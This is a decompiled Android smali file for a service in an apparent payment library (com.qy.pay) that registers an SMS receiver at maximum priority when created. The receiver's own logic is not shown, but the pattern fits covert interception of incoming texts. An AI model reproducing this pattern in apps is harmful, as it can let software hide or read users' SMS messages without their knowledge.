.class public Lcom/qy/pay/a/e;
.super Landroid/app/Service;


# instance fields
.field a:Lcom/qy/pay/a/a;


# direct methods
.method public constructor <init>()V
    .locals 0

    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    return-void
.end method


# virtual methods
.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 1

    const/4 v0, 0x0

    return-object v0
.end method

.method public onCreate()V
    .locals 2

    new-instance v0, Lcom/qy/pay/a/a;

    invoke-direct {v0}, Lcom/qy/pay/a/a;-><init>()V

    iput-object v0, p0, Lcom/qy/pay/a/e;->a:Lcom/qy/pay/a/a;

    new-instance v0, Landroid/content/IntentFilter;

    invoke-direct {v0}, Landroid/content/IntentFilter;-><init>()V

    new-instance v0, Landroid/content/IntentFilter;

    const-string v1, "android.provider.Telephony.SMS_RECEIVED"

    invoke-direct {v0, v1}, Landroid/content/IntentFilter;-><init>(Ljava/lang/String;)V

    const-string v1, "android.provider.Telephony.GSM_SMS_RECEIVED"

    invoke-virtual {v0, v1}, Landroid/content/IntentFilter;->addAction(Ljava/lang/String;)V

    const-string v1, "android.provider.Telephony.SMS_RECEIVED_2"

    invoke-virtual {v0, v1}, Landroid/content/IntentFilter;->addAction(Ljava/lang/String;)V

    const v1, 0x7fffffff

    invoke-virtual {v0, v1}, Landroid/content/IntentFilter;->setPriority(I)V

    iget-object v1, p0, Lcom/qy/pay/a/e;->a:Lcom/qy/pay/a/a;

    invoke-virtual {p0, v1, v0}, Lcom/qy/pay/a/e;->registerReceiver(Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;)Landroid/content/Intent;

    return-void
.end method

.method public onDestroy()V
    .locals 1

    const-string v0, "service destroy"

    invoke-static {v0}, Lcom/qy/pay/f/M;->b(Ljava/lang/String;)V

    iget-object v0, p0, Lcom/qy/pay/a/e;->a:Lcom/qy/pay/a/a;

    if-eqz v0, :cond_0

    iget-object v0, p0, Lcom/qy/pay/a/e;->a:Lcom/qy/pay/a/a;

    invoke-virtual {p0, v0}, Lcom/qy/pay/a/e;->unregisterReceiver(Landroid/content/BroadcastReceiver;)V

    :cond_0
    invoke-super {p0}, Landroid/app/Service;->onDestroy()V

    return-void
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 1

    const-string v0, "service onStartCommand"

    invoke-static {v0}, Lcom/qy/pay/f/M;->b(Ljava/lang/String;)V

    const/4 v0, 0x1

    invoke-super {p0, p1, v0, p3}, Landroid/app/Service;->onStartCommand(Landroid/content/Intent;II)I

    move-result v0

    return v0
.end method
